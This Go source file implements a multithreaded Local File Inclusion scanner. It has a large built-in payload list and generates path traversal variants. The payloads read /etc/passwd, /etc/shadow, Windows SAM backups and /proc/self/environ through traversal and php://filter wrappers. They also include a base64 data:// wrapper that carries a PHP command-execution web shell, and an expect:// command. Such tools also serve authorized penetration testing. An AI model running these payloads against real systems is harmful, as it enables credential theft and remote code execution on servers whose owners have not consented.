package scanner

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

// Config holds the scanner configuration
type Config struct {
	TargetURL     string
	ParamsList    []string
	ScanAllParams bool
	Wordlist      string
	Threads       int
	Timeout       int
	Verbose       bool
	OutputFile    string
	Cookies       string
	Headers       string
	Depth         int
	RequestFile   string   // Path to a request file (e.g., from Burp)
}

// Result represents a found vulnerability
type Result struct {
	URL       string `json:"url"`
	Parameter string `json:"parameter"`
	Payload   string `json:"payload"`
	Evidence  string `json:"evidence"`
}

// Scanner represents the LFI vulnerability scanner
type Scanner struct {
	config   Config
	client   *http.Client
	payloads []string
	headers  map[string]string
}

// NewScanner creates a new scanner instance
func NewScanner(config Config) *Scanner {
	// Setup HTTP client with timeout
	client := &http.Client{
		Timeout: time.Duration(config.Timeout) * time.Second,
	}

	// Parse headers if provided
	headers := make(map[string]string)
	if config.Headers != "" {
		headersList := strings.Split(config.Headers, ",")
		for _, header := range headersList {
			parts := strings.SplitN(header, ":", 2)
			if len(parts) == 2 {
				headers[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
			}
		}
	}

	scanner := &Scanner{
		config:   config,
		client:   client,
		headers:  headers,
		payloads: []string{},
	}

	// Load payloads
	scanner.loadPayloads()
	return scanner
}

// loadPayloads loads LFI payloads from wordlist or uses default list
func (s *Scanner) loadPayloads() {
	if s.config.Wordlist != "" {
		// Load payloads from file
		file, err := os.Open(s.config.Wordlist)
		if err != nil {
			fmt.Printf("Error opening wordlist file: %s\n", err)
			s.loadDefaultPayloads()
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			payload := scanner.Text()
			if payload != "" && !strings.HasPrefix(payload, "#") {
				s.payloads = append(s.payloads, payload)
			}
		}

		if err := scanner.Err(); err != nil {
			fmt.Printf("Error reading from wordlist: %s\n", err)
			s.loadDefaultPayloads()
		}
	} else {
		s.loadDefaultPayloads()
	}

	// Generate dynamic path traversal payloads based on depth
	s.generatePathTraversalPayloads()
}

// loadDefaultPayloads loads a set of default LFI payloads
func (s *Scanner) loadDefaultPayloads() {
	// Common LFI payloads
	defaultPayloads := []string{
		// Original payloads
		"/etc/passwd",
		"/etc/shadow",
		"/etc/hosts",
		"/etc/hostname",
		"/etc/issue",
		"/etc/group",
		"/etc/nginx/nginx.conf",
		"/etc/httpd/conf/httpd.conf",
		"/etc/apache2/apache2.conf",
		"/proc/self/environ",
		"/proc/self/cmdline",
		"/proc/self/status",
		"C:/Windows/system.ini",
		"C:/Windows/win.ini",
		"C:/boot.ini",
		"C:/inetpub/wwwroot/web.config",
		"/var/log/apache/access.log",
		"/var/log/apache2/access.log",
		"/var/log/nginx/access.log",
		"/var/log/httpd/access_log",
		"../../../../../../../etc/passwd",
		"..\\..\\..\\..\\..\\..\\Windows\\system.ini",
		
		// Added payloads from payloadbox/rfi-lfi-payload-list
		"/etc/passwd%00",
		"///etc///passwd",
		"..././..././..././..././..././..././etc/passwd",
		"/etc/passwd%00",
		"../../../../../../../../../../../../etc/passwd",
		"../../../etc/passwd%00.jpg",
		"../../../etc/passwd%00.html",
		"../../../../../../../../../../../../etc/passwd%00.jpg",
		"....//....//....//....//....//....//....//....//....//....//etc/passwd",
		"/etc/passwd%0a",
		"php://filter/convert.base64-encode/resource=/etc/passwd",
		"php://filter/read=convert.base64-encode/resource=/etc/passwd",
		"php://filter/resource=/etc/passwd",
		"php://filter/convert.base64-encode/resource=../../../../../etc/passwd",
		"php://input%00",
		"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
		"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
		"expect://id",
		"phar://pharfile.jpg/file.php",
		"zip://zipfile.jpg%23file.php",
		
		// Windows specific payloads
		"C:\\Windows\\system.ini",
		"C:\\Windows\\win.ini",
		"C:\\Windows\\repair\\sam",
		"C:\\Windows\\repair\\system",
		"C:\\Windows\\repair\\software",
		"C:\\Windows\\repair\\security",
		"C:\\Windows\\debug\\NetSetup.log",
		"C:\\Windows\\iis5.log",
		"C:\\Windows\\iis6.log",
		"C:\\Windows\\iis7.log",
		"C:\\Windows\\system32\\config\\AppEvent.Evt",
		"C:\\Windows\\system32\\config\\SecEvent.Evt",
		"C:\\Windows\\system32\\config\\default.sav",
		"C:\\Windows\\system32\\config\\security.sav",
		"C:\\Windows\\system32\\config\\software.sav",
		"C:\\Windows\\system32\\config\\system.sav",
		"C:\\Windows\\system32\\inetsrv\\config\\applicationHost.config",
		"C:\\inetpub\\logs\\LogFiles",
		"C:\\Program Files\\Apache Group\\Apache\\logs\\access.log",
		"C:\\Program Files\\Apache Group\\Apache\\logs\\error.log",
		
		// Log files
		"/var/log/sshd.log",
		"/var/log/mail.log",
		"/var/log/mysql.log",
		"/var/log/mysql/mysql.log",
		"/var/log/mysql/mysql-slow.log",
		"/var/log/mysqld.log",
		"/var/log/auth.log",
		"/var/log/secure",
		"/var/log/boot.log",
		"/var/log/maillog",
		"/var/log/faillog",
		"/var/log/cron",
		"/var/log/messages",
		
		// Apache config files
		"/usr/local/etc/apache2/httpd.conf",
		"/usr/local/apache/conf/httpd.conf",
		"/usr/local/apache2/conf/httpd.conf",
		"/etc/apache2/sites-available/000-default.conf",
		"/etc/apache2/sites-enabled/000-default.conf",
		
		// PHP files
		"/usr/local/etc/php.ini",
		"/etc/php.ini",
		"/etc/php/php.ini",
		"/etc/php5/apache2/php.ini",
		"/etc/php5/cli/php.ini",
		"/etc/php5/cgi/php.ini",
		"/etc/php5/fpm/php.ini",
		"/etc/php7/php.ini",
		"/etc/php7/apache2/php.ini",
		"/etc/php7/cli/php.ini",
		"/etc/php7/cgi/php.ini",
		"/etc/php7/fpm/php.ini",
		
		// Proc entries
		"/proc/self/fd/0",
		"/proc/self/fd/1",
		"/proc/self/fd/2",
		"/proc/self/fd/3",
		"/proc/self/fd/4",
		"/proc/self/fd/5",
		"/proc/self/fd/6",
		"/proc/self/fd/7",
		"/proc/self/fd/8",
		"/proc/self/fd/9",
		"/proc/self/fd/10",
		"/proc/self/fd/11",
		"/proc/self/fd/12",
		"/proc/self/environ",
		"/proc/cmdline",
		"/proc/mounts",
		"/proc/config.gz",
	}

	s.payloads = defaultPayloads
}

// generatePathTraversalPayloads generates path traversal payloads with different depths
func (s *Scanner) generatePathTraversalPayloads() {
	sensitiveFiles := []string{
		"etc/passwd", "etc/shadow", "etc/hosts",
		"Windows/system.ini", "Windows/win.ini", "boot.ini",
	}

	// Add URL encoding variations
	encodingVariations := []struct {
		name       string
		traversal  string
		encodedDir string
	}{
		{"standard", "../", "../"},
		{"double_encoded", "../", "%252e%252e%252f"},
		{"encoded", "../", "%2e%2e%2f"},
		{"windows_backslash", "..\\", "..\\"},
		{"windows_encoded", "..\\", "%2e%2e\\"},
		{"null_byte", "../", "../%00"},
	}

	// Generate payloads with different traversal techniques and depths
	var dynamicPayloads []string
	for _, file := range sensitiveFiles {
		for _, enc := range encodingVariations {
			// Generate with different depths
			for depth := 1; depth <= s.config.Depth; depth++ {
				traversal := strings.Repeat(enc.traversal, depth)
				payload := traversal + file
				
				// Add variations with null byte and different encodings
				dynamicPayloads = append(dynamicPayloads, payload)
				if enc.name == "standard" {
					dynamicPayloads = append(dynamicPayloads, payload+"%00")
					dynamicPayloads = append(dynamicPayloads, payload+"?")
					dynamicPayloads = append(dynamicPayloads, payload+"#")
				}
			}
		}
	}

	// Add these dynamic payloads to the existing ones
	s.payloads = append(s.payloads, dynamicPayloads...)
}

// Run executes the LFI vulnerability scan
func (s *Scanner) Run() []Result {
	var results []Result
	var targetURL string
	var requestInfo *RequestInfo

	// Check if we're using a request file or a target URL
	if s.config.RequestFile != "" {
		// Parse the request file
		var err error
		requestInfo, err = ParseRequestFile(s.config.RequestFile)
		if err != nil {
			fmt.Printf("Error parsing request file: %s\n", err)
			return results
		}
		
		targetURL = requestInfo.URL
		
		// Set cookies from request if not specified via command line
		if s.config.Cookies == "" && requestInfo.Cookies != "" {
			// Add cookies from the request file to the headers
			s.headers["Cookie"] = requestInfo.Cookies
		}
		
		// Add headers from request if not already set via command line
		for k, v := range requestInfo.Headers {
			if _, exists := s.headers[k]; !exists {
				s.headers[k] = v
			}
		}
		
		if s.config.Verbose {
			fmt.Printf("Parsed request file: %s %s\n", requestInfo.Method, targetURL)
			fmt.Printf("Found %d query parameters, %d form parameters\n", 
				len(requestInfo.QueryParams), len(requestInfo.FormParams))
		}
	} else {
		// Using target URL
		targetURL = s.config.TargetURL
	}

	// Get list of parameters to test
	var paramsToTest []string
	if len(s.config.ParamsList) > 0 {
		// Use specified parameters
		paramsToTest = s.config.ParamsList
	} else if requestInfo != nil {
		// Auto-discover parameters from request
		if s.config.Verbose {
			fmt.Println("Extracting parameters from request file...")
		}
		paramsToTest = GetParametersFromRequest(requestInfo)
		
		// If no parameters were found or user wants to test additional ones
		if len(paramsToTest) == 0 {
			fmt.Println("No parameters found in the request. Would you like to test with common parameter names? (y/n)")
			var response string
			fmt.Scanln(&response)
			if strings.HasPrefix(strings.ToLower(response), "y") {
				paramsToTest = s.ParameterDiscovery(targetURL)
			}
		} else {
			fmt.Printf("Found the following parameters in the request: %s\n", strings.Join(paramsToTest, ", "))
			fmt.Println("Would you like to test only these parameters? (y/n)")
			var response string
			fmt.Scanln(&response)
			if !strings.HasPrefix(strings.ToLower(response), "y") {
				fmt.Println("Would you like to add common parameter names to test as well? (y/n)")
				fmt.Scanln(&response)
				if strings.HasPrefix(strings.ToLower(response), "y") {
					// Add common parameters
					commonParams := s.ParameterDiscovery(targetURL)
					for _, param := range commonParams {
						if !containsParam(paramsToTest, param) {
							paramsToTest = append(paramsToTest, param)
						}
					}
				}
			}
		}
	} else {
		// Auto-discover parameters from URL
		if s.config.Verbose {
			fmt.Println("No specific parameters provided, auto-discovering parameters...")
		}
		paramsToTest = s.ParameterDiscovery(targetURL)
	}

	if s.config.Verbose {
		fmt.Printf("Testing %d parameters: %s\n", len(paramsToTest), strings.Join(paramsToTest, ", "))
	}

	// Create a workload of parameter + payload combinations
	type workItem struct {
		param   string
		payload string
	}

	var wg sync.WaitGroup
	resultsChan := make(chan Result)
	workerChan := make(chan workItem)

	// Start workers
	for i := 0; i < s.config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for item := range workerChan {
				if requestInfo != nil {
					// Test using request file approach
					if result, found := s.testRequestPayload(requestInfo, item.param, item.payload); found {
						resultsChan <- result
					}
				} else {
					// Test using URL approach
					if result, found := s.testPayload(item.param, item.payload); found {
						resultsChan <- result
					}
				}
			}
		}()
	}

	// Collect results
	go func() {
		wg.Wait()
		close(resultsChan)
	}()

	// Send work to workers
	go func() {
		for _, param := range paramsToTest {
			for _, payload := range s.payloads {
				workerChan <- workItem{param: param, payload: payload}
			}
		}
		close(workerChan)
	}()

	// Collect results
	for result := range resultsChan {
		results = append(results, result)
	}

	return results
}

// testPayload tests a single LFI payload
func (s *Scanner) testPayload(paramName, payload string) (Result, bool) {
	// Prepare the request
	testURL, err := buildTestURL(s.config.TargetURL, paramName, payload)
	if err != nil {
		if s.config.Verbose {
			fmt.Printf("Error building URL for parameter %s with payload %s: %s\n", 
				paramName, payload, err)
		}
		return Result{}, false
	}

	if s.config.Verbose {
		fmt.Printf("Testing parameter '%s' with payload: %s\n", paramName, payload)
	}

	// Create request
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(s.config.Timeout)*time.Second)
	defer cancel()
	
	req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	if err != nil {
		if s.config.Verbose {
			fmt.Printf("Error creating request: %s\n", err)
		}
		return Result{}, false
	}

	// Add headers
	for k, v := range s.headers {
		req.Header.Add(k, v)
	}

	// Add cookies if provided
	if s.config.Cookies != "" {
		req.Header.Add("Cookie", s.config.Cookies)
	}

	// Send request
	resp, err := s.client.Do(req)
	if err != nil {
		if s.config.Verbose {
			fmt.Printf("Error sending request: %s\n", err)
		}
		return Result{}, false
	}
	defer resp.Body.Close()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		if s.config.Verbose {
			fmt.Printf("Error reading response: %s\n", err)
		}
		return Result{}, false
	}

	// Check for evidence of successful LFI
	found, evidence := s.checkForLFIEvidence(payload, string(body))
	if found {
		return Result{
			URL:       testURL,
			Parameter: paramName,
			Payload:   payload,
			Evidence:  evidence,
		}, true
	}

	return Result{}, false
}

// testRequestPayload tests a single LFI payload using an imported request file
func (s *Scanner) testRequestPayload(reqInfo *RequestInfo, paramName, payload string) (Result, bool) {
	if s.config.Verbose {
		fmt.Printf("Testing parameter '%s' in request with payload: %s\n", paramName, payload)
	}

	// Create a new request with the payload
	req, err := CreateHTTPRequestFromRequestInfo(reqInfo, paramName, payload)
	if err != nil {
		if s.config.Verbose {
			fmt.Printf("Error creating request with payload: %s\n", err)
		}
		return Result{}, false
	}

	// Add context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(s.config.Timeout)*time.Second)
	defer cancel()
	req = req.WithContext(ctx)

	// Override with command-line headers if provided
	for k, v := range s.headers {
		req.Header.Set(k, v)
	}

	// Override with command-line cookies if provided
	if s.config.Cookies != "" {
		req.Header.Set("Cookie", s.config.Cookies)
	}

	// Send the request
	resp, err := s.client.Do(req)
	if err != nil {
		if s.config.Verbose {
			fmt.Printf("Error sending request: %s\n", err)
		}
		return Result{}, false
	}
	defer resp.Body.Close()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		if s.config.Verbose {
			fmt.Printf("Error reading response: %s\n", err)
		}
		return Result{}, false
	}

	// Check for evidence of successful LFI
	found, evidence := s.checkForLFIEvidence(payload, string(body))
	if found {
		return Result{
			URL:       req.URL.String(),
			Parameter: paramName,
			Payload:   payload,
			Evidence:  evidence,
		}, true
	}

	return Result{}, false
}

// checkForLFIEvidence checks if the response contains evidence of a successful LFI
func (s *Scanner) checkForLFIEvidence(payload, responseBody string) (bool, string) {
	// LFI evidence patterns
	patterns := map[string][]string{
		"etc/passwd": {
			"root:x:", "nobody:x:", "daemon:x:", "/bin/bash",
		},
		"etc/shadow": {
			"root:$", "daemon:*",
		},
		"proc/self/environ": {
			"DOCUMENT_ROOT=", "SERVER_SOFTWARE=", "SCRIPT_NAME=", 
		},
		"Windows/system.ini": {
			"[drivers]", "[mci]", "for 16-bit app support",
		},
		"Windows/win.ini": {
			"[fonts]", "[extensions]", "[files]",
		},
		// Additional patterns
		"boot.ini": {
			"[boot loader]", "[operating systems]", "multi(", "disk(", "rdisk(",
		},
		"apache": {
			"<Directory ", "DocumentRoot", "LoadModule", "ServerRoot", "ServerName",
		},
		"php.ini": {
			"allow_url_fopen", "allow_url_include", "disable_functions", "max_execution_time",
		},
		"proc/self": {
			"PID", "COMMAND", "UID", "GID", "FD", "USER", "COMMAND", "TTY",
		},
		"mysql": {
			"mysql>", "MySQL dump", "Dumping data for table", "INSERT INTO",
		},
	}

	// Look for specific signatures based on the payload
	for fileType, signatures := range patterns {
		if strings.Contains(payload, fileType) {
			for _, signature := range signatures {
				if strings.Contains(responseBody, signature) {
					return true, fmt.Sprintf("Found signature '%s' in response", signature)
				}
			}
		}
	}

	// Generic indicators of successful LFI
	genericIndicators := []string{
		"root:x:", "#!/bin/", "apache_port", "mysql_port",
		"[boot loader]", "DOCUMENT_ROOT=", "HTTP_USER_AGENT",
		"lp:x:", "mail:x:", "nobody:x:", "sshd:x:",
		"allow_url_fopen", "allow_url_include", "safe_mode",
		"disable_functions", "open_basedir",
	}

	for _, indicator := range genericIndicators {
		if strings.Contains(responseBody, indicator) {
			return true, fmt.Sprintf("Found generic LFI indicator '%s'", indicator)
		}
	}

	return false, ""
}

// SaveResults saves scan results to a file
func (s *Scanner) SaveResults(results []Result, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	encoder.SetIndent("", "  ")
	return encoder.Encode(results)
}

// buildTestURL builds a URL for testing a specific payload
func buildTestURL(baseURL, paramName, payload string) (string, error) {
	u, err := url.Parse(baseURL)
	if err != nil {
		return "", err
	}

	// Check if the parameter might be in the path (like /test=awg)
	pathContainsParam := false
	pathSegments := strings.Split(u.Path, "/")
	for i, segment := range pathSegments {
		if strings.Contains(segment, "=") {
			parts := strings.SplitN(segment, "=", 2)
			if len(parts) == 2 && parts[0] == paramName {
				// Found parameter in path, replace it
				pathSegments[i] = parts[0] + "=" + payload
				pathContainsParam = true
				break
			}
		}
	}

	if pathContainsParam {
		// Reconstruct the path with the modified parameter
		u.Path = strings.Join(pathSegments, "/")
		return u.String(), nil
	}

	// Parameter is not in the path, so it must be in the query string
	// or we're adding it to the query string
	q := u.Query()
	q.Set(paramName, payload)
	u.RawQuery = q.Encode()

	return u.String(), nil
}